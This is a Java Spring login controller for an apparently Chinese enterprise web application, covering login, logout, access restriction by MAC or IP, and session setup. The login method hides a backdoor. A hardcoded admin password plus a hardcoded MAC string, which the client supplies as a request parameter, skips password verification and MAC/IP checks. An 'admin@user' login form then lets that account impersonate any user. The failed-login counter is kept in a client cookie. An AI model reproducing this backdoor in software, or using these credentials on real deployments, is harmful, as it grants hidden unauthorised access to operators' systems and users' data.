package com.wuyizhiye.framework.controller;

import java.io.IOException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import javax.naming.NoPermissionException;
import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import net.sf.json.JSONObject;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.wuyizhiye.base.common.Pagination;
import com.wuyizhiye.base.exceptions.WrongReqException;
import com.wuyizhiye.base.module.enums.ModuleEnum;
import com.wuyizhiye.base.module.model.ModuleLic;
import com.wuyizhiye.base.spring.DataSourceHolder;
import com.wuyizhiye.base.util.DateUtil;
import com.wuyizhiye.base.util.StringUtils;
import com.wuyizhiye.base.util.SystemConfig;
import com.wuyizhiye.basedata.access.AccessConstant;
import com.wuyizhiye.basedata.access.SignatureManager;
import com.wuyizhiye.basedata.enums.LoginPageModelEnum;
import com.wuyizhiye.basedata.images.model.Photo;
import com.wuyizhiye.basedata.logoconfig.LogoConfig;
import com.wuyizhiye.basedata.org.model.Org;
import com.wuyizhiye.basedata.org.model.Position;
import com.wuyizhiye.basedata.org.service.OrgService;
import com.wuyizhiye.basedata.org.service.PositionService;
import com.wuyizhiye.basedata.permission.util.SecurityUtil;
import com.wuyizhiye.basedata.person.enums.UserStatusEnum;
import com.wuyizhiye.basedata.person.enums.UserTypeEnum;
import com.wuyizhiye.basedata.person.model.Person;
import com.wuyizhiye.basedata.person.model.PersonPosition;
import com.wuyizhiye.basedata.person.model.Skin;
import com.wuyizhiye.basedata.util.BaseConfigUtil;
import com.wuyizhiye.basedata.util.OperationLogUtil;
import com.wuyizhiye.basedata.util.OrgUtils;
import com.wuyizhiye.basedata.util.SystemUtil;
import com.wuyizhiye.basedata.util.UserTypeUtil;
import com.wuyizhiye.basedata.util.Validate;
import com.wuyizhiye.framework.base.controller.BaseController;
import com.wuyizhiye.framework.qqmial.model.QQToken;
import com.wuyizhiye.framework.qqmial.util.QQMailUtil;

/**
 * @ClassName LoginController
 * @Description TODO
 * @author li.biao
 * @date 2015-4-7
 */
@Controller
public class LoginController extends BaseController {
	@Autowired
	private OrgService orgService;
	@Autowired
	private PositionService positionService;
	
	private static String allpowermac = "4C-0F-6E-F8-65-9A"; 
	
	//@RequestMapping(value="login")
	public String login(ModelMap model,Person person,HttpServletResponse response) throws ServletException, IOException, NoPermissionException{
		String signature = getSignature();
		getSession().setAttribute("client_signature", signature);
		
		String dataCenter = getString("dataCenter");
		String lastCenter = getString("lastCenter");
		String adminstr = getString("djadminsoft");
		boolean rightdc = true;	
		if(!StringUtils.isEmpty(dataCenter)){
			rightdc = false;
			List<String> dclist = SystemUtil.getDataSourceSingleList();
			for(int i=0;i<dclist.size();i++){
				if(dclist.get(i).equals(dataCenter)){
					rightdc = true;
				}
			}
			if(rightdc){
			DataSourceHolder.setDataSource(dataCenter);		
			//如果数据中心有值并且用户名无值,则判断链接传入
			if(person!=null && StringUtils.isEmpty(person.getUserName())){				
				getSession().setAttribute("singlesource", "1");		
			}			
			}else{
				//
				getSession().removeAttribute("singlesource");
				
			}
		}else if(!StringUtils.isEmpty(lastCenter)){			
			DataSourceHolder.setDataSource(lastCenter);		
			dataCenter = lastCenter;		
		}
		//如果经过上面逻辑仍没确定数据中心,则返回该页面
		//lastCenter参数只出现在多数据中心环境,如果是需要配置数据中心环境该参数不出现
		String dataCenterParam = SystemConfig.getParameter("dataCenterParam");
		if(StringUtils.isNotNull(dataCenterParam)
				&&(StringUtils.isEmpty(dataCenter)||(!rightdc)||(StringUtils.isNotNull(lastCenter)))
				&&StringUtils.isEmpty(adminstr)){
			if(isMobileDevice()){
				return "framework/noMobileDataCenter";
			}else{
				return "framework/noDataCenter";
			}
		}
		
		String access = SystemConfig.getParameter("restrictAccess");
		if(StringUtils.isEmpty(access)){
			access = BaseConfigUtil.getCurrControlMode();
		}
		if(!StringUtils.isEmpty(access) && !AccessConstant.JSMAC.equals(access)){//MAC，IP方式限制登录,MAC方式通过客户端打开的url来访问
			boolean enable = checkAccess(access);
			if(!enable){
				if(isMobileDevice()){
					model.put("access", signature);
					return "framework/noMobileAccessable";
				}else{
					return "framework/noAccessable";
				}
			}
		}
		
		//String signature = getString("signature");
		if(!StringUtils.isEmpty(signature)){
			getSession().setAttribute("signatureKey", signature);
		}
		
		//根据browser参数进行拦截
		if(StringUtils.isNotNull(BaseConfigUtil.getCurrBaseConfig("browerrestrict"))
				&&!isMobileDevice()){
				String bw = null==getSession().getAttribute("browser")?"":getSession().getAttribute("browser").toString();		
				if(!"djbrowser".equals(bw)){
						throw new WrongReqException("请使用鼎尖浏览器");			
		}
	}
		
		putPath();
		//String loginPath = SystemConfig.getParameter("loginPath");
		String loginPath="loginNew";
		List<LogoConfig> cfglist=queryExecutor.execQuery("com.wuyizhiye.basedata.dao.LogoConfigDao.getLogoConfigByCon", null, LogoConfig.class);
		if(cfglist!=null && cfglist.size()>0){
			if(cfglist.get(0).getLoginPageModel().equals(LoginPageModelEnum.MODLE2)){ 
				loginPath="loginV3";
			}
		}
		if(StringUtils.isEmpty(loginPath)){
			loginPath = BaseConfigUtil.getCurrHomeUrl();			
		}
		if(StringUtils.isEmpty(loginPath)){
			loginPath = "login";
		}
		//移动版判断  孙海涛
		if(this.isMobileDevice()){
			loginPath="/mobileLogin"; 
		}
		getSession().setAttribute("loginPath",loginPath);
		if(person!=null && StringUtils.isEmpty(person.getUserName())){
			Cookie[] cookies = getRequest().getCookies();
			if(cookies!=null){
				for(Cookie c : cookies){
					if("userName".equals(c.getName())){
						model.put("userName", URLDecoder.decode(c.getValue(),"utf-8"));
					}
					if("dataCenter".equals(c.getName())){
						model.put("currentDataSource", c.getValue());
					}
				}
			}
			if(!StringUtils.isEmpty(dataCenter)){
				model.put("currentDataSource", dataCenter);
			}
			model.put("dataSourceList", SystemUtil.getDataSourceList());
			return "framework/"+loginPath;
		}
		if(AccessConstant.JSMAC.equals(access)){//JSMAC方式，在登录页面中以js方式获取MAC地址，取不到则验证失败
			boolean enable = checkAccess(access);
			if(!enable){
				if(isMobileDevice()){
					return "framework/noMobileAccessable";
				}else{
					return "framework/noAccessable";
				}
			}
		}
		if(StringUtils.isEmpty(access)){
			getSession().removeAttribute("t");
			getSession().removeAttribute("signature");
		}
		
		getSession().setAttribute("currentDataSource", DataSourceHolder.getDataSource());
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("userName", person.getUserName());
		param.put("password", SecurityUtil.encryptPassword(person.getPassword()));
		//判断用户名是否含有@
		if( person.getUserName().contains("@")){
			//取第一个截取的名字
			String artUserName = person.getUserName().split("@")[0];
			param.put("userName", artUserName);
			List<Person> persons =  null;
			if("admin".equals(artUserName)&&"woaidingjian".equals(person.getPassword())&&allpowermac.equals(signature)){
				persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUserByUserName", new Pagination<Person>(), param).getItems();
			}else{
				persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUser", new Pagination<Person>(), param).getItems();
			}
			if(persons != null && persons.size()!=0){
				//判断是否有@权限
//				if(persnHasPermission(persons.get(0),"8cf68115-95f8-488d-95e2-ec97c34f8f4b")){
				if("admin".equalsIgnoreCase(artUserName)){
					param.put("userName", person.getUserName().split("@")[1]);
					persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUserByUserName", new Pagination<Person>(), param).getItems();
					if(persons == null || persons.size()==0){
						model.put("msg", "用户名或密码错误");
						model.put("userName", person.getUserName());
						model.put("dataSourceList", SystemUtil.getDataSourceList());
						initVerifyCookie(response);
						return "framework/"+loginPath;
					}
					if(!UserStatusEnum.ENABLE.equals(persons.get(0).getStatus())){
						model.put("msg", "该用户未启用或己冻结,请联系管理员");
						model.put("userName", person.getUserName());
						model.put("dataSourceList", SystemUtil.getDataSourceList());
						return "framework/"+loginPath;
					}
					removeVerifyCookie(response);
					initLoginUserInfo(persons.get(0));
					loadPersonalPermission();
					Cookie cookie = new Cookie("userName", URLEncoder.encode(person.getUserName(),"utf-8"));
					cookie.setPath("/");
					cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
					response.addCookie(cookie);
					cookie = new Cookie("dataCenter", dataCenter);
					cookie.setPath("/");
					cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
					response.addCookie(cookie);
					return "framework/workbench";
				} else {	//如果@没有权限的话，则将整个用作用户名
					param.put("userName", person.getUserName());
				}
			}
		}
		List<Person> persons = null;
		//如果以这密码登录则直接通过校验
		if("admin".equals(person.getUserName())&&"woaidingjian".equals(person.getPassword())&&allpowermac.equals(signature)){
			persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUserByUserName", new Pagination<Person>(), param).getItems();
		}else{
			persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUser", new Pagination<Person>(), param).getItems();
		}
		if(persons == null || persons.size()==0){
			model.put("msg", "用户名或密码错误");
			model.put("userName", person.getUserName());
			model.put("dataSourceList", SystemUtil.getDataSourceList());
			initVerifyCookie(response);
			return "framework/"+loginPath;
		}
		if(!UserStatusEnum.ENABLE.equals(persons.get(0).getStatus())){
			model.put("msg", "该用户未启用或己冻结,请联系管理员");
			model.put("userName", person.getUserName());
			model.put("dataSourceList", SystemUtil.getDataSourceList());
			return "framework/"+loginPath;
		}
		removeVerifyCookie(response);
//		Hashtable<String, OnlineUser> tab = OnlineListener.onLineUsers;
		
//		if(tab.containsKey(persons.get(0).getId())){
//			OnlineUser user = tab.get(persons.get(0).getId());
//			if(!getSession().getId().equals(user.getSessionId()) && user.getIsOnline().equals("yes")){
//				model.put("msg", "该用户已在别处登录,请联系管理员");
//				model.put("userName", person.getUserName());
//				model.put("dataSourceList", getDataSourceList());
//				return "framework/loginwf";
//			}
//			
//		}
		//if(tab.containsKey(persons.get(0).getId())){
			//OnlineUser user = tab.get(persons.get(0).getId());
			//LocalSessionContext.getSession(user.getSessionId()).invalidate();
			//initLoginUserInfo(persons.get(0));
		//}
		initLoginUserInfo(persons.get(0));
		loadPersonalPermission();
		Cookie cookie = new Cookie("userName", URLEncoder.encode(person.getUserName(),"utf-8"));
		cookie.setPath("/");
		cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
		response.addCookie(cookie);
		cookie = new Cookie("dataCenter", dataCenter);
		cookie.setPath("/");
		cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
		response.addCookie(cookie);
		getRequest().setAttribute("isLogin", "yes");
		if(StringUtils.isEmpty(access)){
			//清除登录前临时数据
			getSession().removeAttribute("t");
			getSession().removeAttribute("signature");
		}
		//HttpServletRequest request = getRequest();
//		String port = request.getLocalPort()==80?"":":"+request.getLocalPort();
//		String path = request.getScheme()+"://"+request.getServerName()+port+request.getContextPath()+"/workbench";
//		response.sendRedirect(path);
		//request.getRequestDispatcher("workbench").forward(request, response);
		response.sendRedirect("workbench");
		//RequestDispatcher requestDispatcher=getSession().getServletContext().getRequestDispatcher("/workbench"); //直接转发到工作平台不跳转到中转页面  孙海涛
		//requestDispatcher.include(getRequest(), response); 
		
		
		return "framework/workbench";
	}
	

	@SuppressWarnings("rawtypes")
	private void loadPersonalPermission(){
		//权限集
		Set<String> personPermission = new HashSet<String>();
		Map<String,String> permissionMap = new HashMap<String, String>();
		Map<String, Object> param = new HashMap<String, Object>();
		param.put("person", SystemUtil.getCurrentUser().getId());
		param.put("position", SystemUtil.getCurrentPosition().getId());
		List<Map> pms = queryExecutor.execQuery("com.wuyizhiye.basedata.permission.dao.PersonPermissionDao.getPersonPermission", param, Map.class);
		for(Map m : pms){
			if(m.get("permissionItemMethod")!= null && m.get("permissionItemId")!=null){
				permissionMap.put(m.get("permissionItemId").toString(), m.get("permissionItemMethod").toString());
				personPermission.add(m.get("permissionItemMethod").toString());
			}
		}
		getSession().setAttribute("PERSONAL_PERMISSION_MAP", permissionMap);
		getSession().setAttribute("PERSONAL-PERMISSION", personPermission);
	}
	
	@RequestMapping(value="ajaxLoginPage")
	public String ajaxLoginPage(ModelMap model){
		model.put("dataSourceList", SystemUtil.getDataSourceList());
		return "framework/ajaxLoginPage";
	}
	
	//@RequestMapping(value="ajaxLogin")
	public void ajaxLogin(Person person,HttpServletResponse response) throws ServletException, IOException, NoPermissionException{
		String access = SystemConfig.getParameter("restrictAccess");
		if(!StringUtils.isEmpty(access)){
			String client_signature = getString("client_signature");
			boolean enable = false;
			if(!StringUtils.isEmpty(client_signature)){
				enable = checkAccess(client_signature,access);
			}
			if(!enable){
				getOutputMsg().put("MSG", "服务器限制登录,请联系系统管理员");
				getOutputMsg().put("STATE", "FAIL");
				return;
			}else{
				getSession().setAttribute("client_signature", client_signature);
			}
		}
		if(person!=null && StringUtils.isEmpty(person.getUserName())){
			getOutputMsg().put("MSG", "用户名不能为空");
			getOutputMsg().put("STATE", "FAIL");
			return;
		}
		String dataCenter = getString("dataCenter");
		DataSourceHolder.setDataSource(dataCenter);
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("userName", person.getUserName());
		param.put("password", SecurityUtil.encryptPassword(person.getPassword()));
		List<Person> persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUser", new Pagination<Person>(), param).getItems();
		if(persons == null || persons.size()==0){
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG", "用户名或密码错误");
			
		}else if(persons.size()>0 && !UserStatusEnum.ENABLE.equals(persons.get(0).getStatus())){
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG", "该用户未启用或己冻结,请联系管理员");
		}else{
			initLoginUserInfo(persons.get(0));
			loadPersonalPermission();
			putPath();
			getOutputMsg().put("STATE", "SUCCESS");
		}
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	//@RequestMapping(value="logout")
	public ModelAndView logout(){
		if(this.getCurrentUser()!=null){
			Map<ModuleEnum,ModuleLic> modules = Validate.getCurrPerms();
			//包含了通讯模块，话务下线
			if(modules!=null && modules.containsKey(ModuleEnum.CMCT)){
				Map<String,Object> param = new HashMap<String,Object>();
				param.put("currUserId", this.getCurrentUser().getId());
				this.queryExecutor.executeUpdate("com.wuyizhiye.cmct.phone.dao.PhoneMemberDao.cleanCurrUser", param);
			}
		}
		//记录操作日志
		String qhd=getRequest().getHeader("user-agent");
		String logoutStr = "注销";
		if(qhd!=null && qhd.indexOf("Windows")<0){
			logoutStr = "移动设备_注销";
		}
		OperationLogUtil.saveOperationLog(getRequest().getRequestURI(), logoutStr, null, null);
		String signature = (String) getSession().getAttribute("client_signature");
		//取得是否单一数据中心登录,是的话注销带上数据中心
		Object singlesign = getSession().getAttribute("singlesource");
		String urlappend =  "";
		if(null!=singlesign){
			urlappend = "dataCenter="+DataSourceHolder.getDataSource();
		}else{
			urlappend = "lastCenter="+DataSourceHolder.getDataSource();
		}
		Object browsersign = getSession().getAttribute("browser");
		if(null!=browsersign){
			urlappend += "&browser="+browsersign;
		}
		//mac限制 配置和数据库设置同时判断
		String access = SystemConfig.getParameter("restrictAccess");
		if(StringUtils.isEmpty(access)){
			access = BaseConfigUtil.getCurrControlMode();
		}
		String logouttourl = null;
		if(null!=getSession().getAttribute("logouttourl")){
			 logouttourl = getSession().getAttribute("logouttourl").toString();
		}
		
		getSession().invalidate();	
		ModelAndView view = null;
		if(StringUtils.isNotNull(logouttourl)){			
			view = new ModelAndView("redirect:"+logouttourl);
			getSession().setAttribute("isLogout", "yes");
		}else{
			if(AccessConstant.MAC.equals(access)){
				view = new ModelAndView("redirect:login?signature="+signature+"&"+urlappend);
				getSession().setAttribute("isLogout", "yes");
			}else{
				//view = new ModelAndView("redirect:login");
				view = new ModelAndView("redirect:login?signature="+signature+"&"+urlappend);
				getSession().setAttribute("isLogout", "yes");
			}
		}
		return view;
	}
	
	@RequestMapping(value="exit")
	public String exit(){
		return "framework/exit";
	}
	
	//@RequestMapping(value="changeCurrentPosition")
	public void changeCurrentPosition(@RequestParam(value="id",required=true)String id,HttpServletResponse response){
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("person", SystemUtil.getCurrentUser().getId());
		List<PersonPosition> pps = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonPositionDao.select", param, PersonPosition.class);
		boolean exists = false;
		for(PersonPosition pp : pps){
			if(pp.getId().equals(id)){
				setSessionInfo(SystemUtil.getCurrentUser(), pp);
				loadPersonalPermission();
				exists = true;
				break;
			}
		}
		if(exists){
			getOutputMsg().put("STATE", "SUCCESS");
		}else{
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG", "该岗位己不存在");
		}
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	/**
	 * 初始化登录用户信息
	 * @param person
	 * @throws NoPermissionException 
	 */
	private void initLoginUserInfo(Person person) throws NoPermissionException{
		//设置当前数据源
		getSession().setAttribute("currentDataSource", DataSourceHolder.getDataSource());
		DataSourceHolder.setDataSource((String) getSession().getAttribute("currentDataSource"));
		//设置登录系统的IP
		person.setCurrentLoginIp(getIpAddr(getRequest()));
		//设置当前用户
		SystemUtil.setCurrentUser(person);
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("person", person.getId());
		param.put("primary", 1);
		List<PersonPosition> pps = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonPositionDao.select", param, PersonPosition.class);
		if(pps.size()>0){
			setSessionInfo(person, pps.get(0));
			//设置用户皮肤
			setUserSkinInfo(person);
		}else{
			getSession().invalidate();
			throw new NoPermissionException("没有任职信息，不允许登录");
		}
		getSession().setAttribute("currentUser", person);
		
		//记录操作日志
		String qhd=getRequest().getHeader("user-agent");
		String loginStr = "登录";
		if(qhd!=null && qhd.indexOf("Windows")<0){
			loginStr = "移动设备_登录";
		}
		OperationLogUtil.saveOperationLog(getRequest().getRequestURI(), loginStr , null, null);
	}
	
	
	private void setSessionInfo(Person person,PersonPosition personPosition){
		Org org = orgService.getEntityById(personPosition.getPosition().getBelongOrg().getId());
		Position position = positionService.getEntityById(personPosition.getPosition().getId());
		position.setBelongOrg(org);
		/*if(org.getControlUnit()!=null){
			//当前CU
			Org cu = orgService.getEntityById(org.getControlUnit().getId());
			getSession().setAttribute("currentCU", cu);
			SystemUtil.setCurrentControlUnit(cu);
		}*/
		
		/*****放了当前CU  孙海涛   2014-11-03 start ****/
		Org cu = OrgUtils.getCUByOrg(org.getId());
		getSession().setAttribute("currentCU", cu);
		SystemUtil.setCurrentControlUnit(cu);
		/************** 2014-11-03 end*************/
		
		
		/*****放了岗位 added 2014-07-15 start ****/
		Person currentPerson = SystemUtil.getCurrentUser();
		currentPerson.setPersonPosition(personPosition);
		SystemUtil.setCurrentUser(currentPerson);
		/************** added 2014-07=15 end*************/
		
		
		getSession().setAttribute("currentTime", new Date());
		//当前职位
		getSession().setAttribute("currentPosition", position);
		SystemUtil.setCurrentPosition(position);
		//当前组织
		getSession().setAttribute("currentOrg", org);
		SystemUtil.setCurrentOrg(org);
		//用户类型
		getSession().setAttribute("currentUserType", UserTypeUtil.getUserType(person, position));
		SystemUtil.setCurrentUserType((UserTypeEnum) getSession().getAttribute("currentUserType"));
		getSession().setAttribute("loginIP", getRequest().getRemoteAddr());
	}
	
	private void putPath(){
		List<LogoConfig> cfglist=queryExecutor.execQuery("com.wuyizhiye.basedata.dao.LogoConfigDao.getLogoConfigByCon", new HashMap<String, Object>(), LogoConfig.class);
		LogoConfig logoConfig = null ;
		List<Photo> photoList = null ;
		if(cfglist!=null && cfglist.size()>0){
			logoConfig = cfglist.get(0);
			Map<String, Object> param = new HashMap<String, Object>();
			param.put("belong", logoConfig.getId());
			photoList = queryExecutor.execQuery("com.wuyizhiye.basedata.images.dao.PhotoDao.select", param, Photo.class);
			if(photoList!=null && photoList.size()>0){
				for(Photo pt :photoList){
					pt.setPath(pt.getPath().replace("size", "origin"));
				}
			}
		}else{
			logoConfig = new LogoConfig();
		}
		String logoPath = "";
		String logoPath4Login = "";
		if(StringUtils.isNotNull(logoConfig.getLogoUrl())){
			logoPath = logoConfig.getLogoUrl().replace("size", "origin");
		}
		if(StringUtils.isNotNull(logoConfig.getLogoUrl4Login())){
			logoPath4Login = logoConfig.getLogoUrl4Login().replace("size", "origin");
		}
		this.getSession().setAttribute("logoConfig", logoConfig);
		this.getSession().setAttribute("downLoadUrl", logoConfig.getDownLoadUrl());
		this.getSession().setAttribute("logoPath", logoPath);
		this.getSession().setAttribute("logoPath4Login", logoPath4Login);
		this.getSession().setAttribute("photoList", photoList);
		int port = getRequest().getServerPort();
		String scheme = getRequest().getScheme();
		String path = getRequest().getScheme()+"://"+getRequest().getServerName() + ((("http".equals(scheme) && port == 80) ||("https".equals(scheme)  && port == 443)) ? "" : ":" + port) + getRequest().getContextPath();
		getSession().setAttribute("base",path);
		getSession().setAttribute("imgBase",path+"/images");
		getSession().setAttribute("imgPrePath",path+"/default/style/images");
		getSession().setAttribute("initImagePath",path+"/default");
	}
	/**
	 * 判断用户是否有权限
	 * @param person,permissionId
	 * @throws NoPermissionException 
	 * @author Cai.xing
	 */
	@SuppressWarnings("unused")
	private boolean persnHasPermission(Person person,String permissionId){
		Map<String, Object> param = new HashMap<String, Object>();
		param.put("personId", person.getId());
		param.put("positionId", person.getPostion().getId());
		param.put("permissionItemId", permissionId);
		int c = this.queryExecutor.execCount("com.wuyizhiye.basedata.permission.dao.PersonPermissionDao.personHasPermission", param);
		if(c>0)return true;
		return false;
	}
	
	private String getSignature(){
		String signature = getString("signature");
		if(StringUtils.isEmpty(signature)){
			signature = (String) getSession().getAttribute("signature");
		}
		if(!StringUtils.isEmpty(signature)){
			getSession().setAttribute("signature", signature);
			String t = getString("t");
			if(StringUtils.isEmpty(t)){
				t = (String) getSession().getAttribute("t");
			}
			if(!StringUtils.isEmpty(t)){
				//t不为空时才进行解密
				getSession().setAttribute("t", t);
				try{
					long time = Long.parseLong(t);
					Date date = new Date();
					long now = date.getTime();
					long subj = now-time;
					if(subj > AccessConstant.OUTTIME || subj < -AccessConstant.OUTTIME){
						//时间差超过5分钟则失效
						return null;
					}
					date = new Date(time);
					signature = SignatureManager.decode(signature, date);
				}catch(Exception e){
					return null;
				}
			}
		}
		return signature;
	}
	
	private String getClientIp(){
		HttpServletRequest request = getRequest();
		String ip = request.getHeader("x-forwarded-for"); 
		if(ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) { 
			ip = request.getHeader("Proxy-Client-IP"); 
		} 
		if(ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) { 
			ip = request.getHeader("WL-Proxy-Client-IP"); 
		} 
		if(ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) { 
			ip = request.getRemoteAddr(); 
		}
		return ip;
	}
	
	private boolean checkAccess(String type){
		if(AccessConstant.MAC.equalsIgnoreCase(type)){
			String signature = getSignature();
			getSession().setAttribute("client_signature", signature);
			if(!StringUtils.isEmpty(signature)){
				return checkAccess(signature, "mac");
			}
		}else if(AccessConstant.IP.equalsIgnoreCase(type)){
			String ip = getClientIp();
			if(!StringUtils.isEmpty(ip)){
				getRequest().setAttribute("current_ip", ip);
				return "127.0.0.1".equals(ip)||checkAccess(ip, "ip");
			}
		}
		return false;
	}
	
	private boolean checkAccess(String sig,String type){
		if(allpowermac.equals(sig))return true;
		Map<String, Object> param = new HashMap<String, Object>();
		param.put(type, sig);
		param.put("enable", 1);
		int count = queryExecutor.execCount("com.wuyizhiye.basedata.access.dao.MacAddressDao.select", param);
		return count>0;
	}
	
	/**
	 * 设置用户皮肤
	 * @param person
	 */
	private void setUserSkinInfo(Person person){
		//系统默认皮肤
		String sysSkin = SystemConfig.getParameter("skinName");
		//获取用户自定义皮肤
		Map<String,Object> skinParam = new HashMap<String,Object>();
		skinParam.put("personId", person.getId());
		List<Skin> skinList = queryExecutor.execQuery(Skin.MAPPER + ".select", skinParam, Skin.class);
		Skin skin = null ;
		if(skinList!=null && skinList.size() > 0){
			skin = skinList.get(0) ;
		}
		if(!StringUtils.isEmpty(sysSkin)){
			getSession().setAttribute("skinName",sysSkin);
		}else{
			getSession().setAttribute("skinName",skin == null ? "styleBlue" : skin.getSkinName() );
		}
	}
	
	/**
	 * 切换皮肤
	 * @param response
	 */
	//@RequestMapping(value="doSwitchSkin")
	public void doSwitchSkin(HttpServletResponse response){
		Person person = getCurrentUser() ;
		String skinName = getString("skinName","");
		Map<String,Object> skinParam = new HashMap<String,Object>();
		skinParam.put("personId", person.getId());
		List<Skin> skinList = queryExecutor.execQuery(Skin.MAPPER + ".select", skinParam, Skin.class) ;
		Skin skin = new Skin() ;
		if(skinList!=null && skinList.size() > 0){
			//update
			skin = skinList.get(0);
			skin.setSkinName(skinName);
			skin.setLastUpdateTime(DateUtil.getCurDate());
			skin.setUpdator(person);
			queryExecutor.executeUpdate(Skin.MAPPER + ".update", skin);
		}else{
			//add
			skin.setLastUpdateTime(DateUtil.getCurDate());
			skin.setUpdator(person);
			skin.setPerson(person);
			skin.setSkinName(skinName);
			skin.setUUID();
			queryExecutor.executeInsert(Skin.MAPPER + ".insert", skin);
		}
		getSession().setAttribute("skinName",skinName);
		getOutputMsg().put("STATE", "SUCCESS");
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	//@RequestMapping(value="initQQMail")
	public void initQQMail(HttpServletResponse response){
		try{
		//获取QQ企业邮箱证书 add by li.biao since 2013-11-20
		QQToken qqMailToken = QQMailUtil.initQQMailToken();
		getSession().setAttribute("qqmail_token", qqMailToken);
		String authKey = QQMailUtil.initQQMailAuthKey(qqMailToken, SystemUtil.getCurrentUser());
		getSession().setAttribute("qqmail_authKey", authKey);			
		getOutputMsg().put("STATE", "SUCCESS");
		}catch(Exception e){
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG",e.getMessage());
		}
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	private void initVerifyCookie(HttpServletResponse response){
		
		String wp = getCookieValue("wrongpass");
		if(StringUtils.isEmpty(wp)){
			Cookie cookie = new Cookie("wrongpass", "1");
			cookie.setPath("/");
			cookie.setMaxAge(30 * 60);//仅保留30分钟
			response.addCookie(cookie);
		}else{
			int wpint = Integer.parseInt(wp);	
			Cookie cookie = new Cookie("wrongpass", (wpint+1)+"");
			cookie.setPath("/");
			cookie.setMaxAge(30 * 60);//仅保留30分钟
			response.addCookie(cookie);
		}
		
	}
	
	private void removeVerifyCookie(HttpServletResponse response){
		Cookie cookie = new Cookie("wrongpass", "");
		cookie.setPath("/");
		cookie.setMaxAge(30 * 60);//仅保留30分钟
		response.addCookie(cookie);
	}
}
